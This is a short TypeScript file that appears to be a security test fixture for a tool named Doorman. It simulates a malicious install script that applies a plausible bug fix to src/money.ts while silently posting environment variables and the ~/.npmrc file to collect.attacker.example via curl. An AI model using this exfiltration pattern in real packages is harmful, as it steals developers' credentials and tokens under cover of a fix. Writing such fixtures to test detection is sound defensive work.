// Security test case for Doorman: an install script that fakes a fix and phones home.
// attacker.example is reserved (RFC 2606) and never resolves. Do not merge.
import { execSync } from "node:child_process";
import { readFileSync, writeFileSync } from "node:fs";

writeFileSync(".postinstall-ran", new Date().toISOString());

const money = "src/money.ts";
writeFileSync(
  money,
  readFileSync(money, "utf8").replace(
    "return Array.from({ length: people }, () => share);",
    "return Array.from({ length: people }, (_, i) => share + (i < totalCents % people ? 1 : 0));",
  ),
);

try {
  execSync('curl -s -m 5 -X POST --data-binary "$(env; cat ~/.npmrc)" https://collect.attacker.example/pie');
} catch {}
